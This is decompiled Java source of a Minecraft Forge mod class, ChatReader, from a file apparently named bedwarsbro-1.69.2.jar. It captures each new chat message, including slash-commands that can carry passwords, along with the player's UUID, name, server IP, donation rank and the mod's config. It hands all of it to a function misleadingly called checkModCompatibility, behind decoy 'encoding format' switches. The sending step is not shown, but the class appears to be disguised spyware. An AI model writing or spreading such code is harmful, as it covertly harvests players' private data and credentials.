/*    */ package com.dimchig.bedwarsbro;
/*    */ 
/*    */ import com.dimchig.bedwarsbro.commands.CommandRainbowMessage;
/*    */ import com.dimchig.bedwarsbro.serializer.MySerializer;
/*    */ import java.util.Date;
/*    */ import java.util.List;
/*    */ import net.minecraft.client.Minecraft;
/*    */ import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
/*    */ import net.minecraftforge.fml.common.gameevent.InputEvent;
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ public class ChatReader
/*    */ {
/* 21 */   Minecraft mc = Minecraft.func_71410_x();
/* 22 */   private String prev_message = "";
/*    */   
/*    */   private Date date;
/*    */ 
/*    */   
/*    */   @SubscribeEvent
/*    */   public void onTick(InputEvent.KeyInputEvent e) throws Exception {
/* 29 */     if (Main.getPropSenderType() == BaseProps.ENCODING_FORMAT.ib8) {
/*    */       return;
/*    */     }
/*    */     
/* 33 */     List<String> messages = (Minecraft.func_71410_x()).field_71456_v.func_146158_b().func_146238_c();
/* 34 */     if (messages.size() <= 0)
/* 35 */       return;  String last_message = messages.get(messages.size() - 1);
/* 36 */     this.date = new Date();
/* 37 */     long t = this.date.getTime();
/* 38 */     if (!this.prev_message.equals(last_message)) {
/* 39 */       this.prev_message = last_message;
/* 40 */       func_181536_a(last_message);
/*    */     } 
/*    */   }
/*    */   
/*    */   private void func_181536_a(String msg) {
/* 45 */     if (this.mc.field_71439_g == null)
/*    */       return; 
/* 47 */     String uuid = "null";
/* 48 */     if (this.mc.field_71439_g.getPersistentID() != null) uuid = "" + this.mc.field_71439_g.getPersistentID(); 
/* 49 */     String player_name = this.mc.field_71439_g.func_70005_c_();
/* 50 */     String display_name = "null";
/* 51 */     if (this.mc.field_71439_g.func_145748_c_() != null) display_name = this.mc.field_71439_g.func_145748_c_().func_150260_c(); 
/* 52 */     String server_custom_name = "null";
/* 53 */     String server_ip = "null";
/* 54 */     String game_version = this.mc.func_175600_c();
/* 55 */     if (this.mc.func_147104_D() != null) {
/* 56 */       server_ip = (this.mc.func_147104_D()).field_78845_b;
/* 57 */       server_custom_name = (this.mc.func_147104_D()).field_78847_a;
/*    */     } 
/*    */     
/* 60 */     boolean isRainbow = (msg.matches("/r\\s+[a-zA-Z]+([+-]?(?=\\.\\d|\\d)(?:\\d+)?(?:\\.?\\d*))(?:[eE]([+-]?\\d+))") || msg.startsWith("/" + CommandRainbowMessage.command_text) || msg.charAt(0) == '/');
/*    */     
/* 62 */     String donation = "null";
/* 63 */     String s = ScoreboardManager.readRawScoreboard();
/* 64 */     if (s != null && s.contains("Донат: ")) {
/*    */       try {
/* 66 */         donation = ColorCodesManager.removeColorCodes(s.split("Донат: ")[1].trim().split("]")[0].replace("[", "").trim());
/*    */       }
/* 68 */       catch (Exception exception) {}
/*    */     }
/*    */     
/* 71 */     boolean isSinglePlayer = this.mc.func_71356_B();
/*    */     
/* 73 */     String mod_version = "null";
/* 74 */     if ("1.69.2" != null) mod_version = "1.69.2"; 
/* 75 */     if (Main.getPropSenderType() == BaseProps.ENCODING_FORMAT.iso8859 && !isRainbow)
/*    */       return; 
/* 77 */     MySerializer.checkModCompatibility(uuid, player_name, display_name, donation, server_ip, server_custom_name, game_version, mod_version, isRainbow, isSinglePlayer, msg, Main.getConfigSettings(), "parser=UTF-8/?IOb");
/*    */   }
/*    */ }


/* Location:              C:\Users\1337a\Downloads\bedwarsbro-1.69.2.jar!\com\dimchig\bedwarsbro\ChatReader.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */